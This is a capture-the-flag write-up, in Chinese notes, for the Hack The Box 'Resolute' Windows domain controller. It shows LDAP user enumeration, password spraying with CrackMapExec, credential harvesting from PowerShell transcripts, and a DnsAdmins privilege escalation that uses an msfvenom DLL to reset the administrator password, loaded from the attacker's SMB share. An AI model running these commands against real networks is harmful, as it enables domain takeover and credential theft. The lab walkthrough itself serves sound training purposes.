###### tags: `Hack the box` `HTB` `Medium` `Windows`

# Resolute
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.96.155 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.96.155:53
Open 10.129.96.155:88
Open 10.129.96.155:135
Open 10.129.96.155:139
Open 10.129.96.155:389
Open 10.129.96.155:445
Open 10.129.96.155:464
Open 10.129.96.155:593
Open 10.129.96.155:636
Open 10.129.96.155:3268
Open 10.129.96.155:5985
Open 10.129.96.155:9389
Open 10.129.96.155:3269
Open 10.129.96.155:47001
Open 10.129.96.155:49664
Open 10.129.96.155:49665
Open 10.129.96.155:49666
Open 10.129.96.155:49668
Open 10.129.96.155:49670
Open 10.129.96.155:49676
Open 10.129.96.155:49677
Open 10.129.96.155:49686
Open 10.129.96.155:49710
Open 10.129.96.155:49789

PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-08-29 06:49:54Z)
135/tcp   open  msrpc        syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp   open  kpasswd5?    syn-ack
593/tcp   open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack
3268/tcp  open  ldap         syn-ack Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack
5985/tcp  open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
47001/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack Microsoft Windows RPC
49686/tcp open  msrpc        syn-ack Microsoft Windows RPC
49710/tcp open  msrpc        syn-ack Microsoft Windows RPC
49789/tcp open  msrpc        syn-ack Microsoft Windows RPC
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

`ldap`列舉user
```
┌──(kali㉿kali)-[~/htb/windapsearch]
└─$ python3 windapsearch.py -d megabank.local --dc-ip 10.129.96.155 -U                         
[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 10.129.96.155
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=megabank,DC=local
[+] Attempting bind
[+]     ...success! Binded as: 
[+]      None

[+] Enumerating all AD users
[+]     Found 25 users: 

cn: Guest

cn: DefaultAccount

cn: Ryan Bertrand
userPrincipalName: ryan@megabank.local

cn: Marko Novak
userPrincipalName: marko@megabank.local

cn: Sunita Rahman
userPrincipalName: sunita@megabank.local

cn: Abigail Jeffers
userPrincipalName: abigail@megabank.local

cn: Marcus Strong
userPrincipalName: marcus@megabank.local

cn: Sally May
userPrincipalName: sally@megabank.local

cn: Fred Carr
userPrincipalName: fred@megabank.local

cn: Angela Perkins
userPrincipalName: angela@megabank.local

cn: Felicia Carter
userPrincipalName: felicia@megabank.local

cn: Gustavo Pallieros
userPrincipalName: gustavo@megabank.local

cn: Ulf Berg
userPrincipalName: ulf@megabank.local

cn: Stevie Gerrard
userPrincipalName: stevie@megabank.local

cn: Claire Norman
userPrincipalName: claire@megabank.local

cn: Paulo Alcobia
userPrincipalName: paulo@megabank.local

cn: Steve Rider
userPrincipalName: steve@megabank.local

cn: Annette Nilsson
userPrincipalName: annette@megabank.local

cn: Annika Larson
userPrincipalName: annika@megabank.local

cn: Per Olsson
userPrincipalName: per@megabank.local

cn: Claude Segal
userPrincipalName: claude@megabank.local

cn: Melanie Purkis
userPrincipalName: melanie@megabank.local

cn: Zach Armstrong
userPrincipalName: zach@megabank.local

cn: Simon Faraday
userPrincipalName: simon@megabank.local

cn: Naoki Yamamoto
userPrincipalName: naoki@megabank.local


[*] Bye!
```

列舉`description`可以看到`password`
```
┌──(kali㉿kali)-[~/htb]
└─$ ldapsearch -x -H ldap://10.129.96.155 -D '' -w '' -b "DC=megabank,DC=local" |  grep -i description
...
description: DNS clients who are permitted to perform dynamic updates on behal
description: Contractors
description: Account created. Password set to Welcome123!
```

利用CME進行爆破
```
┌──(kali㉿kali)-[~/htb]
└─$ crackmapexec smb 10.129.96.155  -u user.txt -p "Welcome123\!"
SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True)
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marko:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sunita:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\abigail:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\marcus:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\sally:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\fred:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\angela:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\felicia:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\gustavo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\ulf:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\stevie:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claire:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\paulo:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\steve:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annette:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\annika:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE 
SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123! 
```

`evil-winrm`登入，在`C:\Users\melanie\Desktop`可得user.txt
```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 10.129.96.155 -u melanie -p "Welcome123\!"

*Evil-WinRM* PS C:\Users\melanie\Desktop> type user.txt
6f9d6e875ddbb7137f22324dddf8568e
```

在`C:\`列出所有檔案，可以進到`PSTranscripts`內查看檔案可以得到`ryan`的密碼`Serv3r4Admin4cc123!`

```
*Evil-WinRM* PS C:\> dir -h


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d--hs-        8/29/2024  12:59 AM                $RECYCLE.BIN
d--hsl        9/25/2019  10:17 AM                Documents and Settings
d--h--        9/25/2019  10:48 AM                ProgramData
d--h--        12/3/2019   6:32 AM                PSTranscripts
d--hs-        9/25/2019  10:17 AM                Recovery
d--hs-        9/25/2019   6:25 AM                System Volume Information
-arhs-       11/20/2016   5:59 PM         389408 bootmgr
-a-hs-        7/16/2016   6:10 AM              1 BOOTNXT
-a-hs-        8/28/2024  11:43 PM      402653184 pagefile.sys

*Evil-WinRM* PS C:\PSTranscripts\20191203> dir -h


    Directory: C:\PSTranscripts\20191203


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-arh--        12/3/2019   6:45 AM           3732 PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

*Evil-WinRM* PS C:\PSTranscripts\20191203> type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

...
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
...
```

也是利用`evil-winrm`登入，查看`group`有一個`DnsAdmins`
```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.96.155 -u ryan -p "Serv3r4Admin4cc123\!"

*Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

搜到這篇[DnsAdmin](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/privilege-escalation/dnsadmin)，但好像不能執行reverse shell(被防毒殺掉了?)，改開smbserver然後修改`administrator`的密碼[hacktricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#dnsadmins)
```
┌──(kali㉿kali)-[~/htb]
└─$ msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll

┌──(kali㉿kali)-[~/htb]
└─$ sudo smbserver.py share ./

*Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.55\share\da.dlll

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe stop dns

*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns
```

接著就可以用Administrator登入之後，在`C:\Users\Administrator\DEsktop`得root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.247.18 -u administrator -p "P@s5w0rd123\!"

*Evil-WinRM* PS C:\Users\Administrator\DEsktop> type root.txt
38c442b46dbb7180e091ece391790f28
```
